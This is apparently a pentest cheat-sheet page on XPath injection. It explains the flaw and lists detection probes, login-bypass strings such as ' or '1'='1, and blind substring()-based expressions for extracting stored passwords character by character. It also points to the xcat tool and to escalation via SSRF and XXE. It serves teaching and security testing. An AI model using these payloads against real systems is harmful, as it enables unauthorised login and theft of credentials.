---
tags:
  - Web
---

# :material-sitemap: XPath Injection

<span class="pill pill-medium">query injection</span> <span class="pill pill-info">web</span>

**XPath injection** is SQLi's cousin for XML: when user input is concatenated into an XPath query used to search an XML document (auth stores, config, data feeds), you can rewrite the query's logic — bypass authentication or extract the whole document node-by-node.

!!! abstract "TL;DR"
    Find input that queries XML (login forms backed by an XML user store are the classic). Break out with `'` / `"`, and — since XPath has **no access control and no comments** — you often read the *entire* document.

## :material-magnify: Detection

Inject quote/metacharacters and watch for XML/XPath errors or logic changes:

```text
'          "          `
' or '1'='1
'](//*)[1]|//foo['
count(//*)
x' or 1=1 or 'x'='y
```

An error mentioning `XPath`, `XPathException`, or a malformed-expression message confirms the sink.

## :material-login: Authentication bypass

A login that runs `//users/user[username/text()='X' and password/text()='Y']` folds to always-true:

```text
Username: ' or '1'='1
Password: ' or '1'='1

# Target just the admin, ignore the password clause
Username: admin' or '1'='1' or 'a'='a
Username: ' or position()=1 or '
```

Because there are no comment terminators in XPath, balance the expression with a trailing `or 'a'='a` instead of commenting out the rest.

## :material-database-export: Blind data extraction

No comments and no `UNION`, so extract character-by-character with boolean/length oracles:

```text
# How many nodes / how long is a value
and count(/*)=1
and string-length(//user[1]/password)=6

# Extract char by char
and substring(//user[1]/password,1,1)='a'
and substring(//user[1]/username,2,1)='d'

# Walk the tree by name
//*[name()='password']
name(/*[1])                 # root element name
//user[position()=1]/child::node()
```

!!! tip "Blind boolean loop"
    Automate the `substring(...)='?'` sweep across the printable charset — same technique as blind [SQLi](sqli.md). Tools: `xcat` automates blind XPath (including out-of-band via DTD/`doc()` where supported).

## :material-fire: Escalation

- **XPath 2.0 / XQuery** engines may expose `doc()`, `unparsed-text()`, or `http:` extensions → file read / [SSRF](ssrf.md).
- If the XML comes from a parser you also feed, pivot to **XXE** for file read and SSRF.

## :material-link-variant: Related

- Same blind-extraction playbook as [SQLi](sqli.md); XML parsing overlaps with XXE and [SSRF](ssrf.md).
- Auth-store injection feeds [Auth Bypass](auth-bypass.md) and [Account Takeover](account-takeover.md).
- Reference: [OWASP XPath Injection](https://owasp.org/www-community/attacks/XPATH_Injection).
